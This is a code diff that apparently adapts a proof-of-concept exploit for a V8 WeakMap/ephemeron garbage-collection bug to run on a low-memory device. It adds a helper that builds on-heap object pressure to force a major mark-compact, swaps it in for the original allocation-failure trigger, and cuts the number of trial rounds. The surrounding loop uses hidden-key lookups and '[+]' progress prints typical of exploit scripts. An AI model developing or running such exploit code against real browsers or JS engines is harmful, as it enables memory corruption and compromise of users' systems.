@@ -18,6 +18,21 @@ var CHUNK = 0x04000000;     // 64 MB; allocated until failure to force a full GC
 // Upstream provokes a 2 GB allocation FAILURE, which is what drives a full
 // mark-compact. This device cannot reach 2 GB, so the failure is manufactured by
 // allocating chunks until the allocator refuses, then releasing them.
+// `new ArrayBuffer` is OFF-heap: it grows no marking worklist. To make a major
+// mark-compact with real ephemeron processing happen, the V8 heap itself has to
+// grow, so allocate many small objects that must be traced.
+function forceOnHeapPressure(blocks, perBlock) {
+  var keep = [];
+  for (var i = 0; i < blocks; i++) {
+    var block = new Array(perBlock);
+    for (var j = 0; j < perBlock; j++) {
+      block[j] = { i: i, j: j, s: 'pad' + j };
+    }
+    keep.push(block);
+  }
+  return keep.length;
+}
+
 function forceAllocationFailure() {
   var held = [];
   var chunks = 0;
@@ -83,7 +98,7 @@ function setUpWeakMap(map) {
 
 var trials = 0;
 var hits = 0;
-var rounds = 150;
+var rounds = 40;
 
 for (var r = 0; r < rounds; r++) {
   try {
@@ -91,7 +106,8 @@ for (var r = 0; r < rounds; r++) {
     // entries and changes the ephemeron ordering the bug depends on.
     map1 = new WeakMap();
     var refs = setUpWeakMap(map1);
-    forceAllocationFailure();
+    var blockCount = forceOnHeapPressure(400, 500);
+    if (r === 0) { print('[+]onheap blocks=' + blockCount); }
     let hiddenKey = getHiddenKey(map1, level, initKey);
     let hiddenMap = map1.get(hiddenKey);
     let k7 = hiddenMap.get(hiddenMap.get(hiddenKey)).get(hiddenKey);
